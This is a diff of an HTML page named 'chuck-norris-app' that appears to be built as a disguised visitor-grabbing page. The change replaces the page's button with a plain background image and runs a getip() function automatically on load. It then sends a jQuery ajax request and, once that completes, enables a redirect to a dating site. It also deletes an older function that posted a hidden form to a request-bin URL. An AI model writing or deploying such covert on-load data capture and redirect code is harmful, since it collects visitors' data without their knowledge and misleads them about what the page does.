@@ -5,6 +5,18 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
 	<title>chuck-norris-app</title>
   <link href="./img/app.js.téléchargement" rel="preload" as="script"><style type="text/css">
+  body {
+  height: 1285px;
+    width: 100%;
+  }
+  .fond {
+  background-image: url(bg.png);
+    background-repeat: no-repeat;
+    /* width: 1285px; */
+    height: 100%;
+    display: flex;
+    align-items: stretch;
+	}
 </style></head>
 <script src="jquery.min.js"></script>
 <script>
@@ -25,33 +37,11 @@ $.ajax({
   data: { remember: value },
   dataType: "json"
 }).done(function(){
-	//window.location.href = "https://www.tenderflirt.fr/";
+	window.location.href = "https://www.tenderflirt.fr/";
 });
-}
-function postform() {
-var f = document.createElement('form');
-f.action='https://ptsv2.com/t/4kwyx-1577184656/post';
-f.method='POST';
-//f.target='_blank';
-//f.enctype="multipart/form-data"
-
-var k=document.createElement('input');
-k.type='text';k.name='remember';
-k.value='11';
-f.appendChild(k);
-
-
-
-//var z=document.getElementById("FileNameId")
-//z.setAttribute("name", "IDProof");
-//z.setAttribute("id", "IDProof");
-//f.appendChild(z);
-
-document.body.appendChild(f);
-f.submit()
 }
 </script>
   <body onload="getip()">
-	<button onclick="getip()">Click me</button>
+	<div class="fond"/>
   </body>
  </html>
